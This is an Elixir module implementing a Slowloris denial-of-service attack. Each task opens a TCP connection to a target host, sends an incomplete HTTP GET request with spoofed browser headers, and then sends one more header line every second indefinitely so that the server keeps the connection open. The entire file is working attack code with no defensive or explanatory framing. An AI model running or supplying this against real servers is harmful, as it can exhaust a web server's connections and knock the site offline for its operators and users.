defmodule SlowLoris do
  use Task

  def start_link(host, port, path, number) do
    {:ok, socket} = :gen_tcp.connect(host, port, [:binary, active: false])
    :gen_tcp.send(socket, 'GET #{path} HTTP/1.1\r\n')
    :gen_tcp.send(socket, 'Host: #{host}:#{port}\r\n')
    :gen_tcp.send(socket, 'Connection: keep-alive\r\n')
    :gen_tcp.send(socket, 'Keep-Alive: 300\r\n')
    :gen_tcp.send(socket, 'Cache-Control: no-cache\r\n')
    :gen_tcp.send(socket, 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36\r\n')
    :gen_tcp.send(socket, 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n')
    :gen_tcp.send(socket, 'Accept-Encoding: gzip, deflate\r\n')
    :gen_tcp.send(socket, 'Accept-Language: en,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7\r\n')

    Task.start_link(__MODULE__, :run, [socket, number])
  end

  def run(socket, number) do
    IO.puts("run #{number}")
    :gen_tcp.send(socket, 'Cookie: test\r\n')
    Process.send_after(self(), {:send, socket}, 1_000)
    receive do
      {:send, socket} -> SlowLoris.run(socket, number)
    end
  end
end
